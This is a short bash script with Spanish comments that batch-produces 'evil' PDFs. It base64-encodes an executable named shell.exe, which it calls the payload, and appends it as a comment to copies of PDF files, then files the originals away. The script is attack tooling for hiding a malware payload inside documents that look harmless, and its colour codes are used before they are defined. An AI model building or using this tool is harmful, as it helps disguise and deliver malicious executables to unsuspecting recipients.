#!/bin/bash

# Archivo PDF base recibido como argumento
datei="$1"

# Validar argumento
if [ -z "$datei" ]; then
  echo -e "${RED}Error:${NC} No se proporcionó el nombre del PDF base"
  exit 1
fi

# Rutas internas
pdf_base="futures/$datei"
payload="shell.exe"
outdir="evils"
outfile="$outdir/evil-$datei"

# Colores
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

# Verifica existencia de PDF base
if [ ! -f "$pdf_base" ]; then
  echo -e "${RED}Error:${NC} PDF base '$pdf_base' no encontrado"
  exit 1
fi

# Verifica existencia de payload
if [ ! -f "$payload" ]; then
  echo -e "${RED}Error:${NC} Payload '$payload' no encontrado"
  exit 1
fi

# Crear carpeta de salida si no existe
mkdir -p "$outdir"

# Incrustar ejecutable en PDF usando base64
base64 "$payload" > "$outdir/payload.b64"
cp "$pdf_base" "$outfile"
echo -e "\n\n% Incrustado:\n$(cat $outdir/payload.b64)" >> "$outfile"

# Mover archivos
mkdir -p dones
mv "$pdf_base" dones/
echo -e "${GREEN}Success:${NC} $datei guardado como ${BLUE}$outfile${NC}"
